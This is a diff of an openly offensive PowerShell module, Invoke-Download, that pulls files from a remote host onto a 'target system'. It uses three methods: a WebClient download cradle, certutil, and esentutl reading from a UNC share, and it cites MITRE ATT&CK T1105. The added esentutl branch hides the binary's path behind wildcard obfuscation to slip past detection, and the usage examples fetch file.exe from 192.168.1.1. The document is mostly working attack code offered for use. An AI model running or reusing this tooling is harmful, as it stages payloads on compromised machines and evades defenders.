@@ -1,65 +1,102 @@
 function Invoke-Download {
+<#
+                                          
+.SYNOPSIS
+	Commands for downloading files to the target system.
 
+.PARAMETER Help
+	Shows detailed help for each function.
+
+.PARAMETER List
+	Shows summary list of available functions.
+
+.PARAMETER PsDownload
+	Downloads a file to the target system using a traditional powershell 'DownloadFile' cradle.
+
+.PARAMETER CertUtil
+	Uses certutil.exe to download a file to the target system. 
+
+.PARAMETER Esentutl
+	Uses Esentutil.exe to download a file from a remote UNC Path.
+	
+.EXAMPLE
+	PS> Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
+
+.EXAMPLE
+	PS> Invoke-Download -CertUtil -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
+	
+.EXAMPLE
+	PS> Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile C:\temp\file.exe
+	
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
+
+#>
 [CmdletBinding()]
 param (
-	[Parameter(ParameterSetName = 'help')]
+	[Parameter(Position=1)]
 	[Switch]$Help,
-	
-	[Parameter(ParameterSetName = 'listcommands')]
 	[Switch]$List,
 	
-	[Parameter(ParameterSetName = 'psDownload')]
+	[Parameter(Mandatory = $False)]
 	[Switch]$PsDownload,
 	[String]$RemoteFile,
 	[String]$LocalFile,
 	
-	[Parameter(ParameterSetName = 'certutil')]
+	[Parameter(Mandatory = $False)]
 	[Switch]$Certutil,
 	[String]$RemoteFile2=[string]$RemoteFile,
-	[String]$LocalFile2=[string]$LocalFile
+	[String]$LocalFile2=[string]$LocalFile,
+	
+	[Parameter(Mandatory = $False)]
+	[Switch]$EsentUtl,
+	[String]$RemoteUNCPath,
+	[String]$LocalFile3=[String]$LocalFile
 )
-
-$Rs2 = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
-$Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
 
 	if ($Help -eq $True) {
 		
 		Write @"
 	
- ### DOWNLOAD HELP ###
- ---------------------
- 
- Invoke-Download [-command] [-parameter(s)]
- 
+ ### Invoke-Download Help ###
+ ----------------------------
  Available Invoke-Download Commands:
  -----------------------------------
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
  | -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file               |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Downloads a file to the target system using a             |
- |      traditional powershell 'downloadfile' cradle.                          |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                             | 
- |      (https://attack.mitre.org/techniques/T1105/)                           |	 
- |                                                                             |
- |  [*] Usage: Invoke-Download -PsDownload -RemoteFile https://server/File.exe |
- |      -LocalFile C:\temp\File.exe                                            |
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+
+   [*] Description: Downloads a file to the target system using a traditional 
+       powershell 'DownloadFile' cradle.                          	 
+
+   [*] Usage: Invoke-Download -PsDownload -RemoteFile https://server/File.exe 
+       -LocalFile C:\temp\File.exe 
+
+   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                               
  
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
  | -CertUtil  [-RemoteFile] remote_File [-LocalFile] local_file                |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Uses certutil to download a file to the target            |
- |      system.                                                                |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)                             | 
- |      (https://attack.mitre.org/techniques/T1105/)                           |	
- |                                                                             |
- |  [*] Usage: Invoke-Download -CertUtil -RemoteFile http://server/File.exe    |
- |      -LocalFile C:\temp\File.exe                                            |
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+
+   [*] Description: Uses certutil to download a file to the target            
+       system.
+
+   [*] Usage: Invoke-Download -CertUtil -RemoteFile http://server/File.exe    
+       -LocalFile C:\temp\File.exe
+
+   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)
+   
+ |-----------------------------------------------------------------------------|
+ | -Esentutl  [-RemoteUNCPath] remote_File [-LocalFile] local_file             |
+ |-----------------------------------------------------------------------------|
+
+   [*] Description: Uses Esentutil.exe to download a file from a remote UNC Path.
+
+   [*] Usage: Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile
+
+   [*] Mitre ATT&CK Ref: T1105 (Remote File Copy)
+
+ \-----------------------------------------------------------------------------/
 
 "@
 	}
@@ -67,17 +104,22 @@ $Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
 	elseif ($List -eq $True) {
 		Write @"
 
- Invoke-Download Command List:
- -----------------------------
- Invoke-Download -PsDownload [-RemoteFile] remote_File [-LocalFile] local_file
- Invoke-Download -CertUtil [-RemoteFile] remote_File [-LocalFile] local_file
+ Invoke-Download Brief Command Usage:
+ ------------------------------------
+ Invoke-Download -PsDownload -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
+ Invoke-Download -CertUtil -RemoteFile https://192.168.1.1/file.exe -LocalFile C:\temp\file.exe
+ Invoke-Download -Esentutl -RemoteUNCPath \\192.168.1.1\share\file.exe -LocalFile
  
 "@
 	}
 	
 	elseif ($PsDownload -and $RemoteFile -and $LocalFile) {
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
 		$h = "`n### Invoke-Download(PsDownload) ###`n"
-		(New-Object System.Net.Webclient).downloadfile($RemoteFile, $LocalFile)
+		(New-Object Net.Webclient).DownloadFile($RemoteFile, $LocalFile)
 		
 		$FileExists = (Test-Path -path $LocalFile)
 		if ($FileExists) {
@@ -110,6 +152,28 @@ $Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
 			$h
 			Write " Download failed. Make sure your File exists at $RemoteFile and that $LocalFile is writable and try again."
 			$h
+		}
+	}
+	elseif ($EsentUtl -and $RemoteUNCPath -and $LocalFile) {
+	# https://twitter.com/egre55/status/985994639202283520
+	
+		$EsentUtlExists = (Test-Path -path "C:\windows\system32\esentutl.exe")
+		if ($EsentUtlExists) {
+			Try {
+				
+				(C:\??*?\*3?\Es*n?U??.?x? /y $RemoteUNCPath /d $LocalFile /o)
+				
+				$LocalFileExists = (Test-Path -path $LocalFile)
+				if ($LocalFileExists) {
+					Write "`n [+] File successfully downloaded to $LocalFile`n"
+				}
+			}
+			Catch {
+				Write "`n [!] Unknown Error.`n"
+			}
+		}
+		if (!$EsentUtlExists) {
+			Write "`n [!] Can't find esentutil.exe in its usual location. Unable to download file.`n"
 		}
 	}
 }
